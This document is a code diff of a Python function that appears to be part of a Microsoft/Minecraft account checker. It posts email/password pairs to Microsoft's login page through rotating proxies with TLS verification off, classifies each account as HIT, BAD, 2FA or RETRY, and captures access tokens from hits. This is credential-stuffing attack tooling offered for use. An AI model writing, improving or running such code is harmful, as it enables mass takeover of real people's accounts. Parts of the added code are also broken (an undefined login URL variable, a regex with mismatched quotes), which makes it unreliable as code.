@@ -305,8 +305,9 @@ class Capture:
 # ══════════════════════════════════════════════════════════════════════
 
 def ms_login_session(email, password, session, proxies_list):
-    """Session-safe MS login"""
+    """Session-safe MS login using Xbox/Minecraft OAuth flow"""
     try:
+        from urllib.parse import quote as _quote
         s = session or requests.Session()
         s.verify = False
         if proxies_list:
@@ -314,65 +315,70 @@ def ms_login_session(email, password, session, proxies_list):
             if isinstance(proxy, dict):
                 s.proxies.update(proxy)
             else:
-                s.proxies.update({'http': 'http://'+proxy, 'https': 'http://'+proxy})
-        
-        url1 = (
-            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
-            "?client_info=1&haschrome=1"
-            f"&login_hint={quote(email)}"
-            "&mkt=en&response_type=code"
-            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-        )
-        r1 = s.get(url1, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
-        post_url = None; ppft = None
-        for pat in [r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
+                s.proxies.update({"http": "http://"+proxy, "https": "http://"+proxy})
+
+        # Step 1: Get login page using the Xbox/Minecraft client ID
+        r1 = s.get(sFTTag_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
+        post_url = None
+        ppft = None
+        for pat in [r'urlPost\s*:\s*["\'](.*?)["\'](?:\s*,)?\s*', r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
             m = re.search(pat, r1.text)
-            if m: post_url = m.group(1).replace("\\/", "/"); break
-        for pat in [r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r'name="PPFT"[^>]*value="([^"]+)"']:
+            if m:
+                post_url = m.group(1).replace("\\/", "/")
+                break
+        for pat in [r'sFTTag\s*:.*?value="([^"]+)"', r'name="PPFT"[^>]*value="([^"]+)"']:
             m = re.search(pat, r1.text)
-            if m: ppft = m.group(1); break
+            if m:
+                ppft = m.group(1)
+                break
         if not post_url or not ppft:
             return {"status": "RETRY"}
-        
+
+        # Step 2: Submit credentials
         body = (
-            f"i13=1&login={quote(email)}&loginfmt={quote(email)}"
-            f"&type=11&LoginOptions=1&passwd={quote(password)}"
-            f"&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1"
-            "&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=9960"
+            f"login={_quote(email)}&loginfmt={_quote(email)}"
+            f"&passwd={_quote(password)}"
+            f"&PPFT={_quote(ppft)}&PPSX=PassportR"
+            "&i13=0&type=11&LoginOptions=3&i19=197664"
         )
         r2 = s.post(post_url, data=body,
-                    headers={"Content-Type":"application/x-www-form-urlencoded"}, allow_redirects=False, timeout=15)
+                    headers={"Content-Type": "application/x-www-form-urlencoded",
+                             "User-Agent": "Mozilla/5.0"},
+                    allow_redirects=True, timeout=15)
         t = r2.text.lower()
-        if "incorrect" in t or r2.text.count('"error"') > 2:
+
+        if any(x in t for x in ["your account or password is incorrect",
+                                  "that microsoft account doesn't exist",
+                                  "we couldn't find an account"]):
             return {"status": "BAD"}
-        if any(x in t for x in ["identity/confirm","proofup","sms","authenticator","consent"]):
+        if r2.text.count('"error"') > 2 and "access_token" not in r2.url:
+            return {"status": "BAD"}
+        if any(x in t for x in ["identity/confirm", "proofup", "sms", "authenticator",
+                                  "consent", "verify your identity", "two-step", "2-step",
+                                  "security info"]):
             return {"status": "2FA"}
-        if "abuse" in t:
+        if "abuse" in t or "blocked" in t:
             return {"status": "BAD"}
-        
-        loc = r2.headers.get("Location", "")
-        if not loc or "code=" not in loc:
+
+        # Step 3: Extract access token from redirect URL fragment
+        access_token = None
+        final_url = r2.url
+        for pat in [r"access_token=([^&#]+)", r"#access_token=([^&#]+)"]:
+            m = re.search(pat, final_url)
+            if m:
+                access_token = m.group(1)
+                break
+        # Fallback: check response body
+        if not access_token:
+            m = re.search(r"access_token["'\s]*[:=]["'\s]*([^&"'\s,}]+)", r2.text)
+            if m:
+                access_token = m.group(1)
+
+        if not access_token:
             return {"status": "BAD"}
-        code = re.search(r"code=([^&]+)", loc).group(1)
+
         cid = s.cookies.get("MSPCID", str(uuid.uuid4())).upper()
-        
-        r3 = s.post(
-            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
-            data=(
-                "client_info=1"
-                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
-                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
-                f"&grant_type=authorization_code&code={code}"
-                "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
-            ),
-            headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=15
-        )
-        if "access_token" not in r3.text:
-            return {"status": "BAD"}
-        token = r3.json()["access_token"]
-        return {"status": "HIT", "token": token, "cid": cid, "session": s}
+        return {"status": "HIT", "token": access_token, "cid": cid, "session": s}
     except:
         return {"status": "RETRY"}
 
